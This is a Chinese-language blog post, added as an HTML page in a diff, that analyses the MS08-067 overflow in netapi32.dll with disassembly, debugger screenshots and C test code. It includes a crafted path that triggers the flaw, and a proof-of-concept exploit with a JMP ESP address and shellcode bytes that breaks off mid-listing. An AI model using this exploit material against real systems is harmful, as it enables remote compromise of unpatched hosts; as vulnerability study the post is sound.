@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简要分析漏洞在netapi32.dll中的导出函数NetpwNameCanonicalize的子函数CanonicalizePathName中。 CanonicalizePathName函数对路径合并的后的字符进以下的一些处理：  将字符串中的”&#x2F;“转化成”&amp;quot;：  12345678910111213.text:5FDDA1F8 rep_slash_loop:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ms08-067">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;26&#x2F;ms08-067%E5%88%86%E6%9E%90&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="简要分析漏洞在netapi32.dll中的导出函数NetpwNameCanonicalize的子函数CanonicalizePathName中。 CanonicalizePathName函数对路径合并的后的字符进以下的一些处理：  将字符串中的”&#x2F;“转化成”&amp;quot;：  12345678910111213.text:5FDDA1F8 rep_slash_loop:">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;26&#x2F;ms08-067%E5%88%86%E6%9E%90&#x2F;ms08067dbg1.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;26&#x2F;ms08-067%E5%88%86%E6%9E%90&#x2F;ms08067dbg2.JPG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;26&#x2F;ms08-067%E5%88%86%E6%9E%90&#x2F;ms08067success.JPG">
+<meta property="og:updated_time" content="2020-04-25T16:30:09.799Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;26&#x2F;ms08-067%E5%88%86%E6%9E%90&#x2F;ms08067dbg1.JPG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/26/ms08-067分析/"/>
+
+
+
+
+
+  <title>ms08-067 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/26/ms08-067%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ms08-067</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-26T00:29:24+08:00">
+                2020-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h2><p>漏洞在netapi32.dll中的导出函数NetpwNameCanonicalize的子函数CanonicalizePathName中。</p>
+<p>CanonicalizePathName函数对路径合并的后的字符进以下的一些处理：</p>
+<ol>
+<li>将字符串中的”/“转化成”&quot;：</li>
+</ol>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>5FDDA1F8 rep_slash_loop:                         <span class="comment">; CODE XREF: CanonicalizePathName+88↓j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA1F8                 <span class="keyword">cmp</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="number">2Fh</span> <span class="comment">; 将"/"转换成"\"</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA1FC                 <span class="keyword">jz</span>      slash_to_back_slash <span class="comment">; 复制"\"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>5FDDA202 slash_to_back_forward:                  <span class="comment">; CODE XREF: CanonicalizePathName+E774↓j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA202                 <span class="keyword">inc</span>     <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA203                 <span class="keyword">inc</span>     <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA204                 <span class="keyword">cmp</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA208                 <span class="keyword">jnz</span>     short rep_slash_loop <span class="comment">; 将"/"转换成"\"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>5FDE88EF slash_to_back_slash:                    <span class="comment">; CODE XREF: CanonicalizePathName+7C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE88EF                 <span class="keyword">mov</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="number">5Ch</span> <span class="comment">; 复制"\"</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE88F4                 <span class="keyword">jmp</span>     slash_to_back_forward</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>调用函数CheckDosPathType，检查合并路径的DOS路径类型：</li>
+</ol>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">text:</span>5FDDA20A chk_dos_path_type:                      <span class="comment">; CODE XREF: CanonicalizePathName+76↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA20A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA210                 <span class="keyword">call</span>    CheckDosPathType</span><br><span class="line"><span class="symbol">.text:</span>5FDDA215                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA217                 <span class="keyword">jnz</span>     short chk_buf_len</span><br><span class="line"><span class="symbol">.text:</span>5FDDA219                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA21F                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Dest</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA220                 <span class="keyword">call</span>    RemoveLegarcyFolder</span><br><span class="line"><span class="symbol">.text:</span>5FDDA225                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA227                 <span class="keyword">jz</span>      short err_invalid_name</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>RemoveLegacyFolder函数中存在溢出的漏洞，RemoveLegacyFolder返回后，如果返回<br>非零，表示合并路径已符合要求，若其长度未超过maxbuf，即可复制至can_path中：</li>
+</ol>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>5FDDA20A chk_dos_path_type:                      <span class="comment">; CODE XREF: CanonicalizePathName+76↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA20A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA210                 <span class="keyword">call</span>    CheckDosPathType</span><br><span class="line"><span class="symbol">.text:</span>5FDDA215                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA217                 <span class="keyword">jnz</span>     short chk_buf_len</span><br><span class="line"><span class="symbol">.text:</span>5FDDA219                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA21F                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Dest</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA220                 <span class="keyword">call</span>    RemoveLegarcyFolder</span><br><span class="line"><span class="symbol">.text:</span>5FDDA225                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA227                 <span class="keyword">jz</span>      short err_invalid_name</span><br><span class="line"><span class="symbol">.text:</span>5FDDA229</span><br><span class="line"><span class="symbol">.text:</span>5FDDA229 chk_buf_len:                            <span class="comment">; CODE XREF: CanonicalizePathName+97↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA229                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA22F                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Str</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA230                 <span class="keyword">call</span>    <span class="built_in">esi</span> <span class="comment">; __imp_wcslen</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA232                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="built_in">eax</span>+<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA236                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C_maxbuf]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA239                 <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA23A                 <span class="keyword">ja</span>      chk_retsize</span><br><span class="line"><span class="symbol">.text:</span>5FDDA240                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Dest]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA246                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; Source</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA247                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+Outbuf]    <span class="comment">; Dest</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA24D                 <span class="keyword">call</span>    <span class="built_in">ds</span>:__imp_wcscpy</span><br><span class="line"><span class="symbol">.text:</span>5FDDA253                 <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA254                 <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA255                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA257</span><br><span class="line"><span class="symbol">.text:</span>5FDDA257 chk_security_cookie:                    <span class="comment">; CODE XREF: CanonicalizePathName+56↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA257                                         <span class="comment">; CanonicalizePathName+E78A↓j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA257                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+security_cookie]</span><br><span class="line"><span class="symbol">.text:</span>5FDDA25A                 <span class="keyword">pop</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA25B                 <span class="keyword">pop</span>     <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA25C                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA25D                 <span class="keyword">call</span>    chk_fail</span><br><span class="line"><span class="symbol">.text:</span>5FDDA262                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>5FDDA263                 <span class="keyword">retn</span>    <span class="number">14h</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>5FDE88F9 chk_retsize:                            <span class="comment">; CODE XREF: CanonicalizePathName+BA↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE88F9                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+ret_size]</span><br><span class="line"><span class="symbol">.text:</span>5FDE88FF                 <span class="keyword">test</span>    <span class="built_in">ecx</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE8901                 <span class="keyword">jz</span>      short NERR_BufTooSmall</span><br><span class="line"><span class="symbol">.text:</span>5FDE8903                 <span class="keyword">mov</span>     [<span class="built_in">ecx</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE8905</span><br><span class="line"><span class="symbol">.text:</span>5FDE8905 NERR_BufTooSmall:                       <span class="comment">; CODE XREF: CanonicalizePathName+E781↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE8905                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">84Bh</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE890A                 <span class="keyword">jmp</span>     chk_security_cookie</span><br></pre></td></tr></table></figure>
+
+<p>关键漏洞点在移除经典目录中的函数中：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>5FDE87F8 update_current_slash_after_copy:        <span class="comment">; CODE XREF: RemoveLegarcyFolder+93↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE87F8                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+cur_slash], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE87FB                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE87FD                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">edi</span>-<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span>5FDE8800                 <span class="keyword">jmp</span>     short check_previous_slash_after_copy</span><br><span class="line">....................</span><br><span class="line"><span class="symbol">.text:</span>5FDE8809 check_previous_slash_after_copy:        <span class="comment">; CODE XREF: RemoveLegarcyFolder+E595↑j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE8809                 <span class="keyword">cmp</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="string">'\'</span></span><br><span class="line"><span class="string">.text:5FDE880D                 jnz     short loop_search_previous_slash</span></span><br></pre></td></tr></table></figure>
+
+<p>这里eax作为向前搜索经典目录中的”&quot;的初始指针，edi指向经典目录中，相对于eax的往前第二个”&quot;，用来移除经典目录中的”..&quot;，但是在这里并没有对eax的地址做边界检查，会导致eax存储一个非预期的地址。</p>
+<p>在这之后函数进行循环搜索”&quot;并在过程的开始对eax做边界检查，但此时已经于事无补，因为此时eax若在之前是越过边界则已经不会与arg_path相等，此时就会不断的在内存空间里每2个字节的往前找”&quot;(0x5C)，直到找到才会停止:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>5FDE8802 loop_search_previous_slash:             <span class="comment">; CODE XREF: RemoveLegarcyFolder+E5A2↓j</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE8802                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_path]</span><br><span class="line"><span class="symbol">.text:</span>5FDE8805                 <span class="keyword">jz</span>      short loc_5FDE880F</span><br><span class="line"><span class="symbol">.text:</span>5FDE8807                 <span class="keyword">dec</span>     <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>5FDE8808                 <span class="keyword">dec</span>     <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
+
+<p>测试代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WCHAR path[<span class="number">256</span>];</span><br><span class="line">	WCHAR can_path[<span class="number">256</span>];</span><br><span class="line">	DWORD type = <span class="number">1000</span>;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	HMODULE handle = LoadLibrary(<span class="string">".\\netapi32.dll"</span>);</span><br><span class="line">	MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Fail to load library!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Trigger = (MYPROC)GetProcAddress(handle, <span class="string">"NetpwPathCanonicalize"</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">	&#123;</span><br><span class="line">		FreeLibrary(handle);</span><br><span class="line">		wprintf(<span class="string">L"Fail to get api address!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	path[<span class="number">0</span>] = <span class="number">0</span>;	</span><br><span class="line">	wcscpy(path, <span class="string">L"\\aaa\\..\\..\\bbbb"</span>);</span><br><span class="line">	can_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	type = <span class="number">1000</span>;</span><br><span class="line">	wprintf(<span class="string">L"BEFORE: %s\n"</span>, path);</span><br><span class="line">	retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">	wprintf(<span class="string">L"AFTER : %s\n"</span>, can_path);</span><br><span class="line">	wprintf(<span class="string">L"RETVAL: %s(0x%X)\n\n"</span>, retval?<span class="string">L"FAIL"</span>:<span class="string">L"SUCCESS"</span>, retval);</span><br><span class="line">	FreeLibrary(handle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当eax越界后，在低地址找到”0x5C”后，内存布局如下：</p>
+<p><img src="/2020/04/26/ms08-067%E5%88%86%E6%9E%90/ms08067dbg1.JPG" alt></p>
+<p>此时eax远小于esp，若当再次调用某个函数，开辟栈空间时，溢出的经典目录部分就可以覆盖掉函数返回地址，这里接下来的是wcscpy进行字符复制函数，这就有可能将函数的返回地址进行修改：</p>
+<p><img src="/2020/04/26/ms08-067%E5%88%86%E6%9E%90/ms08067dbg2.JPG" alt></p>
+<p>测试的脚本：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(__stdcall *MYPROC)</span> <span class="params">(LPWSTR,  LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// address of jmp esp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JMP_ESP <span class="meta-string">"\x23\xfd\xe0\x5f\x00\x00"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//shellcode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELL_CODE \</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span> \</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span>\</span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span>\</span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span>\</span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span>\</span><br><span class="line"><span 